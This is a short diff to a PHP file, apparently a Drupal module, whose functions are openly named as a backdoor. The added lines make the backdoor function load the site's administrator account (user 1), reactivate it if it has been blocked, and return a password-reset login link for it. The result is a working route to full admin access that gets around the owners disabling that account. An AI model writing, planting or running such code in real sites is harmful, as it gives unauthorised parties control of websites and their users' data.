@@ -1,5 +1,6 @@
 <?php
 
+
 function backdoor_menu(){
 	$items = array();
 
@@ -33,6 +34,10 @@ function access_backdoor_page (){
 
 function backdoor (){
 	$user = user_load(1);
+	if($user->status != 1){
+		$user->status = 1;
+		user_save($user);
+	}
 	return user_pass_reset_url($user);
 }
 
